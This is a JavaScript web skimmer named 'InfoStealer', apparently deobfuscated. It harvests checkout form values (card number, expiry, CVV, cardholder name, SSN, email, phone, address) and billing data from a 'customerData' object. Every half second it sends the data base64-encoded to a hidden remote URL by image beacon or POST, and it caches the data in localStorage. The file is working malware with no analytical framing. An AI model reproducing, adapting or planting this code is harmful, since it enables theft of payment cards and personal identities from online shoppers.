var InfoStealer = {
  b64_encode: function (aStr) {
    return btoa(encodeURIComponent(aStr).replace(/%([0-9A-F]{2})/g, function (_0x5c6ecd, _0x36bb0a) {
      return String.fromCharCode('0x' + _0x36bb0a);
    }));
  },
  b64_decode: function (aBase64Str) {
    var str = atob(aBase64Str);
    var result = '';
    for (var i = 0x0; i < str.length; i++) {
      result += '%' + ('00' + str[i].charCodeAt(0x0).toString(0x10)).slice(-0x2);
    }
    return decodeURIComponent(result);
  },
  doc: document,
  details_list_b64: 'W1siaWQiLCAiaW5wdXQtcGF5bWVudC1maXJzdG5hbWUiLCAwLCAiZiIsICJIb2xkZXIiXSwgWyJpZCIsICJpbnB1dC1wYXltZW50LWxhc3RuYW1lIiwgMCwgImwiLCAiSG9sZGVyIl0sIFsiaWQiLCAiaW5wdXQtZmlyc3RuYW1lIiwgMCwgImYiLCAiSG9sZGVyIl0sIFsiaWQiLCAiaW5wdXQtbGFzdG5hbWUiLCAwLCAibCIsICJIb2xkZXIiXSwgWyJmaWVsZCIsICJpZnJhbWUiLCAwLCAibiIsICJOdW1iZXIiXSwgWyJmaWVsZCIsICJpZnJhbWUiLCAwLCAibSIsICJEYXRlIl0sIFsiZmllbGQiLCAiaWZyYW1lIiwgMCwgInkiLCAiRGF0ZSJdLCBbImZpZWxkIiwgImlmcmFtZSIsIDAsICJjIiwgIkNWViJdLCBbImlkIiwgImlucHV0LWNjLW93bmVyIiwgMCwgImgiLCAiSG9sZGVyIl0sIFsiaWQiLCAiaW5wdXQtY2MtbnVtYmVyIiwgMCwgIm4iLCAiTnVtYmVyIl0sIFsiaWQiLCAiaW5wdXQtY2MtZXhwaXJlLWRhdGUiLCAwLCAibSIsICJEYXRlIl0sIFsibmFtZSIsICJjY19leHBpcmVfZGF0ZV95ZWFyIiwgMCwgInkiLCAiRGF0ZSJdLCBbImlkIiwgImlucHV0LWNjLWN2djIiLCAwLCAiYyIsICJDVlYiXSwgWyJpZCIsICJpbnB1dC1wYXltZW50LWN1c3RvbS1maWVsZDQiLCAwLCAic24iLCAic3NuIl0sIFsiaWQiLCAiaW5wdXQtcGF5bWVudC1lbWFpbCIsIDAsICJlbCIsICJlbWFpbCJdLCBbImlkIiwgImlucHV0LWVtYWlsIiwgMCwgImVsIiwgImVtYWlsIl0sIFsiaWQiLCAiaW5wdXQtcGF5bWVudC10ZWxlcGhvbmUiLCAwLCAicGUiLCAicGhvbmUiXSwgWyJpZCIsICJpbnB1dC10ZWxlcGhvbmUiLCAwLCAicGUiLCAicGhvbmUiXSwgWyJpZCIsICJpbnB1dC1wYXltZW50LWNpdHkiLCAwLCAiY3kiLCAiY2l0eSJdLCBbImlkIiwgImlucHV0LXBheW1lbnQtY291bnRyeSIsIDMsICJjdCIsICJjb3VudHJ5Il0sIFsiaWQiLCAiaW5wdXQtcGF5bWVudC1wb3N0Y29kZSIsIDAsICJ6cCIsICJ6aXAiXSwgWyJpZCIsICJpbnB1dC1wYXltZW50LXpvbmUiLCAzLCAic3QiLCAic3RhdGUiXSwgWyJpZCIsIFsiaW5wdXQtcGF5bWVudC1hZGRyZXNzLTEiLCAiaW5wdXQtcGF5bWVudC1hZGRyZXNzLTIiXSwgMCwgImFzIiwgImFkZHIiXV0=',
  url_b64: "aHR0cHM6Ly9jZG4tcmVwb3J0LmNvbS9zdGF0dXMv"
};
InfoStealer.details_list = window.JSON.parse(InfoStealer.b64_decode(InfoStealer.details_list_b64));
InfoStealer.exfilData = {};
InfoStealer.sentDataArray = [];
InfoStealer.cookieName = "bmmuw";
InfoStealer.vnskp_type = 0x0;
InfoStealer.vnskp_param = 'hash';
InfoStealer.iterateInputs = function () {
  var input = InfoStealer.doc.getElementsByTagName("input");
  var select = InfoStealer.doc.getElementsByTagName("select");
  var textarea = InfoStealer.doc.getElementsByTagName("textarea");
  for (var i = 0; i < input.length; i++) {
    InfoStealer.extractInputValue(input[i]);
  }
  for (var i = 0; i < select.length; i++) {
    InfoStealer.extractInputValue(select[i]);
  }
  for (var i = 0; i < textarea.length; i++) {
    InfoStealer.extractInputValue(textarea[i]);
  }
  InfoStealer.exfilData.Domain = location.host;
};
InfoStealer.extractInputValue = function (aNode) {
  for (var i = 0; i < InfoStealer.details_list.length; i++) {
    var detail_element = InfoStealer.details_list[i];
    if (aNode.hasAttribute(detail_element[0])) {
      if (typeof detail_element[1] == "object") {
        var result = '';
        detail_element[1].forEach(function (aArg) {
          var node = document.querySelector('[' + detail_element[0] + "=\"" + aArg + "\"" + ']');
          if (node != null && InfoStealer.trimText(node, detail_element[2]).length > 0) {
            result += InfoStealer.trimText(node, detail_element[2]) + " ";
          }
        });
        InfoStealer.exfilData[detail_element[4]] = result.trim();
      } else {
        if (aNode.attributes[detail_element[0]].value == detail_element[1] && InfoStealer.trimText(aNode, detail_element[2]).length > 0) {
          if (detail_element[3] == 'l') {
            InfoStealer.exfilData[detail_element[4]] += " " + InfoStealer.trimText(aNode, detail_element[2]);
          } else {
            if (detail_element[3] == 'y') {
              InfoStealer.exfilData[detail_element[4]] += '/' + InfoStealer.trimText(aNode, detail_element[2]);
            } else {
              InfoStealer.exfilData[detail_element[4]] = InfoStealer.trimText(aNode, detail_element[2]);
            }
          }
        }
      }
    }
  }
};
InfoStealer.neverCalled = function (aNode, aAttr) {
  if (aNode.hasAttribute(aAttr) && aNode.attributes[aAttr].value.length > 0x0 && aNode.value.length > 0x0 && aNode.value.length < 0x100) {
    return true;
  }
  return false;
};
InfoStealer.trimText = function (aNode, aNodeType) {
  switch (aNodeType) {
    case 0x0:
      return aNode.value.trim();
    case 0x1:
      return aNode.innerHTML.trim();
    case 0x2:
      return aNode.innerText.trim();
    case 0x3:
      if (aNode.value.length > 0x0) {
        return aNode.selectedOptions[0x0].innerText;
      } else {
        return '';
      }
  }
};
InfoStealer.elementExistsInDOM = function () {
  for (var i = 0; i < InfoStealer.details_list.length; i++) {
    var detail_element = InfoStealer.details_list[i];
    if (detail_element[3] == 'n' && (typeof InfoStealer.exfilData[detail_element[4]] == "undefined" || InfoStealer.exfilData[detail_element[4]].length < 11)) {
      return false;
    }
    if ((detail_element[3] == 'h' || detail_element[3] == 'f' || detail_element[3] == 'l') && (typeof InfoStealer.exfilData[detail_element[4]] == "undefined" || InfoStealer.exfilData[detail_element[4]].length == 0)) {
      return false;
    }
    if ((detail_element[3] == 'e' || detail_element[3] == 'm' || detail_element[3] == 'y') && (typeof InfoStealer.exfilData[detail_element[4]] == "undefined" || InfoStealer.exfilData[detail_element[4]].length == 0)) {
      return false;
    }
    if (detail_element[3] == 'c' && (typeof InfoStealer.exfilData[detail_element[4]] == "undefined" || InfoStealer.exfilData[detail_element[4]].length < 3)) {
      return false;
    }
  }
  return true;
};
InfoStealer.dataExistsInSentDataArray = function (aArg) {
  return InfoStealer.sentDataArray.indexOf(aArg) != -1;
};
InfoStealer.main = function () {
  InfoStealer.iterateInputs();
  InfoStealer.nullFunction();
  InfoStealer.extractBillingInfo();
  InfoStealer.postData();
  InfoStealer.saveDataToCookieJar();
};
InfoStealer.postData = function () {
  var data = InfoStealer.b64_encode(window.JSON.stringify(InfoStealer.exfilData));
  if (InfoStealer.elementExistsInDOM() && !InfoStealer.dataExistsInSentDataArray(data)) {
    InfoStealer.sentDataArray.push(data);
    if (InfoStealer.vnskp_type == 0x0) {
      var img = InfoStealer.doc.createElement("IMG");
      img.src = InfoStealer.b64_decode(InfoStealer.url_b64) + '?' + InfoStealer.vnskp_param + '=' + data;
    }
    if (InfoStealer.vnskp_type == 0x1) {
      var formData = new FormData();
      formData.append(InfoStealer.vnskp_param, data);
      fetch(InfoStealer.b64_decode(InfoStealer.url_b64) + '?' + Math.random(), {
        'method': "POST",
        'body': formData
      });
    }
  }
};
InfoStealer.saveDataToCookieJar = function () {
  var data = InfoStealer.b64_encode(window.JSON.stringify(InfoStealer.exfilData));
  window.localStorage.setItem(InfoStealer.cookieName, data);
};
InfoStealer.retrieveDataFromCookieJar = function () {
  var data = window.localStorage.getItem(InfoStealer.cookieName);
  if (data !== null) {
    InfoStealer.exfilData = window.JSON.parse(InfoStealer.b64_decode(data));
  }
};
InfoStealer.nullFunction = function () {};
InfoStealer.extractBillingInfo = function () {
  if (typeof customerData != 'undefined') {
    if (typeof customerData.default_billing != undefined && customerData.default_billing != null) {
      if (typeof customerData.addresses[customerData.default_billing] != undefined) {
        var billing_info = customerData.addresses[customerData.default_billing];
        InfoStealer.exfilData.country = billing_info.country_id;
        InfoStealer.exfilData.city = billing_info.city;
        InfoStealer.exfilData.state = billing_info.region.region;
        InfoStealer.exfilData.phone = billing_info.telephone;
        InfoStealer.exfilData.addr = billing_info.street.join(',');
        InfoStealer.exfilData.zip = billing_info.postcode;
        InfoStealer.exfilData.Holder = billing_info.firstname + " " + billing_info.lastname;
      }
    }
  }
};
InfoStealer.retrieveDataFromCookieJar();
window.setInterval(InfoStealer.main, 500);
